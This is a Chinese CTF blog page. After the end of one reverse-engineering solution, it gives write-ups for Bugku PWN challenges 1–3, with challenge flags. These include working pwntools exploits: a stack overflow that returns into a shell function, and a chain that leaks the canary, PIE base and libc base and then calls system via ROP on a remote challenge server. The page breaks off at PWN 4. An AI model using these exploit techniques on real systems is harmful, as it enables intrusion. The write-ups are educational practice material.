<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getinput</span><span class="params">()</span>:</span></span><br><span class="line">    target = <span class="number">1835996258</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="number">2</span> * i % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">            target = check1(target,i - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="number">2</span> * i % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">            target = check2(target,i - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            target = check3(target,i - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> target</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check1</span><span class="params">(input,loopNum)</span>:</span></span><br><span class="line">    t = input</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        t = t - i</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check3</span><span class="params">(input,loopNum)</span>:</span></span><br><span class="line">    t = input</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">        t = t - i</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check2</span><span class="params">(input, loopNum)</span>:</span></span><br><span class="line">    t = input</span><br><span class="line">    <span class="keyword">if</span> loopNum % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">            t -= i</span><br><span class="line">        <span class="keyword">return</span> t</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        t += i</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  getinput()</span><br></pre></td></tr></table></figure>

<p>得到答案：<strong>alictf{Jan6N100p3r}</strong></p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/05/Bugku-PWN/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/10/05/Bugku-PWN/" class="post-title-link" itemprop="url">Bugku-PWN</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-10-05 06:50:27 / Modified: 21:50:54" itemprop="dateCreated datePublished" datetime="2019-10-05T06:50:27-07:00">2019-10-05</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="PWN-1"><a href="#PWN-1" class="headerlink" title="PWN 1"></a>PWN 1</h2><p>没啥好说直接nc上去cat flag就是了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~$ nc 114.116.54.89 10001</span><br><span class="line">ls</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">helloworld</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">cat flag</span><br><span class="line">flag&#123;6979d853add353c9&#125;</span><br></pre></td></tr></table></figure>

<h2 id="PWN-2"><a href="#PWN-2" class="headerlink" title="PWN 2"></a>PWN 2</h2><p>先检查一下文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:/mnt/hgfs/share/Bugku/PWN/pwn2$ checksec pwn2</span><br><span class="line">[*] '/mnt/hgfs/share/Bugku/PWN/pwn2/pwn2'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>直接拿IDA Pro打开反汇编一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"say something?"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"oh,that's so boring!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现栈只开了0x30的大小，却可以读取0x100个字符，存在明显的栈溢出漏洞，然后发现一个getshell函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_shell_</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"tql~tql~tql~tql~tql~tql~tql"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"this is your flag!"</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"cat flag"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显只要我们劫持path到这里就完事了，十分容易</p>
<p>接下来直接给exp吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process("./pwn2")</span></span><br><span class="line">p = remote(<span class="string">'114.116.54.89 '</span>, <span class="number">10003</span>)</span><br><span class="line">getshell = <span class="number">0x400751</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x38</span>+p64(getshell)</span><br><span class="line">p.recvuntil(<span class="string">'say something?\n'</span>) </span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] Closed connection to 114.116.54.89  port 10003</span><br><span class="line">oh,that's so boring!</span><br><span class="line">tql~tql~tql~tql~tql~tql~tql</span><br><span class="line">this is your flag!</span><br><span class="line">flag&#123;n0w_y0u_kn0w_the_Stack0verfl0w&#125;</span><br></pre></td></tr></table></figure>

<h2 id="PWN-3"><a href="#PWN-3" class="headerlink" title="PWN 3"></a>PWN 3</h2><p>先检查一下文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] '/mnt/hgfs/share/Bugku/PWN/pwn3/read_note'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>防护全开，十分厉害的样子，直接拿IDA Pro打开反汇编一下，没有<strong>system</strong>，需要用<strong>libc</strong>构造<strong>shell</strong>，有<strong>canary</strong>保护，需要读<strong>canary</strong>的值，随机地址，需要读程序基址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> note_len; <span class="comment">// [rsp+4h] [rbp-4ECh]</span></span><br><span class="line">  FILE *fp; <span class="comment">// [rsp+8h] [rbp-4E8h]</span></span><br><span class="line">  <span class="keyword">char</span> fpath[<span class="number">20</span>]; <span class="comment">// [rsp+10h] [rbp-4E0h]</span></span><br><span class="line">  <span class="keyword">char</span> memory[<span class="number">600</span>]; <span class="comment">// [rsp+30h] [rbp-4C0h]</span></span><br><span class="line">  <span class="keyword">char</span> thinking_note[<span class="number">600</span>]; <span class="comment">// [rsp+290h] [rbp-260h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+4E8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">memset</span>(memory, <span class="number">0</span>, <span class="number">0x258</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(fpath, <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(thinking_note, <span class="number">0</span>, <span class="number">0x258</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to noteRead system"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"there is there notebook: flag, flag1, flag2"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"  Please input the note path:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, fpath, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( fpath[<span class="built_in">strlen</span>(fpath) - <span class="number">1</span>] == <span class="number">10</span> )</span><br><span class="line">    fpath[<span class="built_in">strlen</span>(fpath) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(fpath) &gt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"note path false!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    fp = fopen(fpath, <span class="string">"r"</span>);</span><br><span class="line">    noteRead(fp, memory, <span class="number">0x244</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(memory);</span><br><span class="line">    fclose(fp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"write some note:"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"  please input the note len:"</span>);</span><br><span class="line">  note_len = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;note_len);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"please input the note:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, thinking_note, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)note_len);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"the note is: "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(thinking_note);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(thinking_note) != <span class="number">624</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"error: the note len must be  624"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"  so please input note(len is 624)"</span>);</span><br><span class="line">    read(<span class="number">0</span>, thinking_note, <span class="number">0x270</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">noteRead</span><span class="params">(FILE *fp, <span class="keyword">char</span> *arg_buf, <span class="keyword">unsigned</span> <span class="keyword">int</span> arg_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  fread(arg_buf, arg_len, <span class="number">1u</span>LL, fp);</span><br><span class="line">  len = <span class="built_in">strlen</span>(arg_buf);</span><br><span class="line">  <span class="keyword">if</span> ( arg_buf[len - <span class="number">1</span>] == <span class="number">10</span> )</span><br><span class="line">    arg_buf[len - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过观察，<strong>thinking_note</strong>是存在栈溢出漏洞的，且<strong>notelen</strong>我们可以控制的。利用<strong>thinking_note</strong>进行栈溢出，每次利用第一个<strong>read</strong>和<strong>puts</strong>获取一个值，第二个<strong>read</strong>恢复栈并跳回<strong>main</strong>函数进行下次攻击</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">memset(thinking_note, 0, 0x258uLL);</span><br><span class="line">__isoc99_scanf(&quot;%d&quot;, &amp;note_len);</span><br><span class="line">read(0, thinking_note, (unsigned int)note_len);</span><br><span class="line">read(0, thinking_note, 0x270uLL);</span><br></pre></td></tr></table></figure>

<p>因为这题存在Canary保护，故第一次肯定为泄露Canary的值，观察下列汇编代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000000</span>AA0                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000000</span>AA1                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000000</span>AA4                 sub     rsp, <span class="number">4F</span>0h</span><br><span class="line">.text:<span class="number">0000000000000</span>AAB                 mov     rax, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">0000000000000</span>AB4                 mov     [rbp<span class="number">-8</span>], rax</span><br><span class="line">.text:<span class="number">0000000000000</span>AB8                 xor     eax, eax</span><br></pre></td></tr></table></figure>

<p>我们不难得出若要泄露<strong>Canary</strong>地址应构造：<strong>“A” * 0x258</strong>，<strong>Canary</strong>的最低位通常是<strong>0x00</strong>，所以要将其覆盖（<strong>puts</strong>函数遇到<strong>0x00</strong>会停止），故最后应构造： <strong>“A” * 0x258+”B”</strong></p>
<p>通过查看IDA可知<strong>main</strong>函数的相对地址为<strong>0x0D20</strong>，因为当<strong>vul</strong>函数执行完毕后需要回到<strong>main</strong>函数，故栈中最后的反回地址应该是<strong>0x0D2E</strong>，故第二次将Canary的值写到对应位置，继续覆盖，最低位变为<strong>0x20</strong>，最后的返回地址从<strong>0D2E</strong>变为<strong>0D20</strong>，这样程序就能返回到<strong>main</strong>函数</p>
<p>第二步读取<strong>vul</strong>的返回地址，第一次写栈到<strong>ebp+8</strong>(<strong>canary</strong>要仍要写到<strong>var_8</strong>对应的位置)，读到返回地址，然后减去<strong>0xD2E</strong>(<strong>IDA</strong>中看到的<strong>vul</strong>的返回地址)</p>
<p>第三步读取<strong>libc</strong>基址,<strong>libc</strong>基址根据<strong>main</strong>函数的返回地址计算,<strong>main</strong>函数在<strong>call vul</strong>之前只有<strong>push rbp</strong>会影响栈，而我们在前两步分别多执行了一次<strong>push rbp</strong>，所以一共是执行了<strong>三</strong>次，那么现在<strong>main</strong>函数返回地址的位置应该和<strong>vul</strong>函数返回地址的位置相差<strong>0x8*4</strong>，也就是<strong>ebp+0x28</strong></p>
<p>故Exp最终如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"114.116.54.89"</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">val_add = <span class="number">0xd2e</span></span><br><span class="line">pop_rdi_add = <span class="number">0xe03</span></span><br><span class="line">puts_plt_add = <span class="number">0x8b0</span></span><br><span class="line">puts_got_add = <span class="number">0x202018</span></span><br><span class="line">start_add = <span class="number">0xd20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"path:"</span>)</span><br><span class="line">p.sendline(<span class="string">"flag"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"len:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1000"</span>)</span><br><span class="line">payload = <span class="string">"A"</span> * (<span class="number">0x260</span><span class="number">-8</span>)+<span class="string">"B"</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"B"</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"cancay:"</span>, hex(canary)</span><br><span class="line">x = p.recvline()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"(len is 624)\n"</span>)</span><br><span class="line">payload = <span class="string">"A"</span> * (<span class="number">0x260</span><span class="number">-8</span>) </span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += <span class="string">"\x20"</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"path:"</span>)</span><br><span class="line">p.sendline(<span class="string">"flag"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"len:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1000"</span>)</span><br><span class="line">payload = <span class="string">"A"</span> * (<span class="number">0x260</span>+<span class="number">7</span>)+<span class="string">"B"</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"B"</span>)</span><br><span class="line">x = p.recvline()</span><br><span class="line">val = u64(x[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"val:"</span>, hex(val)</span><br><span class="line">elf_base = val - val_add</span><br><span class="line"><span class="keyword">print</span> hex(elf_base)</span><br><span class="line">p.recvuntil(<span class="string">"(len is 624)\n"</span>)</span><br><span class="line">payload = <span class="string">"A"</span> * (<span class="number">0x260</span><span class="number">-8</span>) </span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += <span class="string">"\x20"</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">puts_plt = elf_base + puts_plt_add</span><br><span class="line">puts_got = elf_base + puts_got_add</span><br><span class="line">pop_rdi = elf_base + pop_rdi_add</span><br><span class="line">start = elf_base + start_add</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"path:"</span>)</span><br><span class="line">p.sendline(<span class="string">"flag"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"len:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1000"</span>)</span><br><span class="line">payload = <span class="string">"A"</span> * (<span class="number">0x260</span> + <span class="number">8</span>*<span class="number">5</span><span class="number">-1</span>)+<span class="string">"B"</span> </span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">"B"</span>)</span><br><span class="line">x = p.recvuntil(<span class="string">"please"</span>)</span><br><span class="line"><span class="keyword">print</span> x</span><br><span class="line">start_abs = u64(x[:<span class="number">8</span>].split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">libc_base = start_abs - <span class="number">0x20830</span></span><br><span class="line"><span class="keyword">print</span> hex(start_abs)</span><br><span class="line">p.recvuntil(<span class="string">"(len is 624)\n"</span>)</span><br><span class="line">payload = <span class="string">"A"</span> * (<span class="number">0x260</span><span class="number">-8</span>) </span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(start)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">bin_add = <span class="number">0x18cd57</span></span><br><span class="line">sys_add = <span class="number">0x45390</span></span><br><span class="line"></span><br><span class="line">bin_abs = libc_base + bin_add</span><br><span class="line">sys_abs = libc_base + sys_add</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"path:"</span>)</span><br><span class="line">p.sendline(<span class="string">"flag"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"len:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1000"</span>)</span><br><span class="line">payload = <span class="string">"A"</span> * (<span class="number">0x260</span><span class="number">-8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bin_abs)</span><br><span class="line">payload += p64(sys_abs)</span><br><span class="line">payload += p64(start)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.recvuntil(<span class="string">"(len is 624)\n"</span>)</span><br><span class="line">payload = <span class="string">"A"</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="PWN-4"><a href="#PWN-4" class="headerlink" title="PWN 4"></a>PWN 4</h2><p>先检查一下文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] '/mnt/hgfs/share/Bugku/PWN/pwn4/pwn4'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>直接拿IDA Pro打开反汇编一下</p>
